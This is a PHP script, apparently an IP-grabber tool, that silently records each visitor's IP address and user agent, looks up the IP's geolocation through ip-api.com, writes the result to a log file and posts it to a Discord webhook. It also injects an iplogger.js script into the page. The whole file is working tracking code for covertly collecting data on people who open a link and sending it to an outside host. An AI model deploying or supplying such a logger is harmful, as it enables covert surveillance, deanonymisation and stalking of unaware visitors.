<?php

function write($data)
{
    File_Put_Contents("logs.txt", $data, FILE_APPEND);
}

function SendDiscordMesg($webhook,$msg)
{
     $headers = [ 'Content-Type: application/json; charset=utf-8' ];
     $POST = [ 'content' => $msg ];
     
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $webhook);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
     $response   = curl_exec($ch);
}

function LogData($webhook)
{ 
    echo "<script src=iplogger.js></script>";
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $data =  file_get_contents("http://ip-api.com/json/".IP() ."?fields=16989897");
    $data = str_replace(',',"\n",$data);
    $data = str_replace('{',"",$data);
    $data = str_replace('}',"",$data);
    $data = $data."\n".
    '"User_agent":'.$user_agent;
    write($data);     
    SendDiscordMesg($webhook,$data);	
}


function IP() 
{ 
    //https://github.com/CybrDev/IP-Logger Get_IP
    $ip = "unknown";
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); 
    else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
    else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
    else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
    
    return $ip;
} 
?>
